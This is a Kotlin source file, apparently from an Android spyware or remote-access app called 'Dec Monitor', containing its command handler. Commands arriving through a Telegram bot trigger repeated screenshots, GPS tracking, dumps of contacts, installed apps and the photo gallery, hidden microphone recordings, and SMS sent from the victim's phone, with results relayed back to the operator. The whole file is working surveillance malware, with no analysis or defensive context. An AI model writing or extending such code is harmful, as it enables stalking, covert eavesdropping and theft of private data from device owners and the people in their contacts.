package com.dec.monitor

import android.content.Context
import com.dec.monitor.media.AmbientRecorder
import com.dec.monitor.media.GalleryDumper
import com.dec.monitor.screen.ScreenshotService
import com.dec.monitor.system.DeviceInfo
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

object CommandHandler {

    fun handle(context: Context, command: String) {
        CoroutineScope(Dispatchers.IO).launch {
            when {
                command == "/screenshot_on" -> {
                    ScreenshotService.fastMode = true
                    TelegramBot.sendMessage("📸 Screenshot mode ON — every 3 seconds")
                }
                command == "/screenshot_off" -> {
                    ScreenshotService.fastMode = false
                    TelegramBot.sendMessage("📸 Screenshot mode OFF — back to 30s interval")
                }
                command == "/location" -> {
                    TelegramBot.sendMessage("📍 Fetching location...")
                    DeviceInfo.getLocation(context)
                }
                command == "/battery" -> {
                    val info = DeviceInfo.getBatteryInfo(context)
                    TelegramBot.sendMessage("🔋 <b>Battery</b>\n$info")
                }
                command == "/contacts" -> {
                    TelegramBot.sendMessage("📒 Fetching all contacts...")
                    DeviceInfo.getContacts(context)
                }
                command == "/apps" -> {
                    val apps = DeviceInfo.getInstalledApps(context)
                    TelegramBot.sendMessage("📱 <b>Installed Apps</b>\n$apps")
                }
                command == "/ring" -> {
                    DeviceInfo.ringDevice(context)
                    TelegramBot.sendMessage("🔔 Ringing device...")
                }
                command == "/gallery5" -> {
                    GalleryDumper.sendLatest(context, 5)
                }
                command == "/gallery20" -> {
                    GalleryDumper.sendLatest(context, 20)
                }
                command == "/galleryhalf" -> {
                    GalleryDumper.sendLatest(context, -2)
                }
                command == "/galleryfull" -> {
                    TelegramBot.sendMessage("⚠️ Sending FULL gallery...")
                    GalleryDumper.sendLatest(context, -1)
                }
                command == "/mic" -> {
                    TelegramBot.sendMessage("🎙 Recording 30s...")
                    AmbientRecorder.record(context, 30)
                }
                command == "/mic60" -> {
                    TelegramBot.sendMessage("🎙 Recording 60s...")
                    AmbientRecorder.record(context, 60)
                }
                command.startsWith("/sms ") -> {
                    val parts = command.removePrefix("/sms ").split(" ", limit = 2)
                    if (parts.size == 2) {
                        DeviceInfo.sendSms(context, parts[0], parts[1])
                        TelegramBot.sendMessage("✅ SMS sent to ${parts[0]}")
                    } else {
                        TelegramBot.sendMessage("❌ Usage: /sms <number> <message>")
                    }
                }
                command == "/help" -> {
                    TelegramBot.sendMessage(
                        """
🤖 <b>Dec Monitor Commands</b>

📸 Screenshot:
/screenshot_on — every 3s fast mode
/screenshot_off — back to 30s

📍 /location — GPS location
🔋 /battery — battery status
📒 /contacts — dump all contacts
📱 /apps — installed apps
🔔 /ring — ring the device

🖼 Gallery:
/gallery5 — last 5 photos
/gallery20 — last 20 photos
/galleryhalf — half gallery
/galleryfull — full gallery dump

🎙 Mic:
/mic — record 30s
/mic60 — record 60s

💬 /sms &lt;number&gt; &lt;message&gt;
❓ /help — this menu
                        """.trimIndent()
                    )
                }
                else -> TelegramBot.sendMessage("❓ Unknown. Send /help")
            }
        }
    }
}
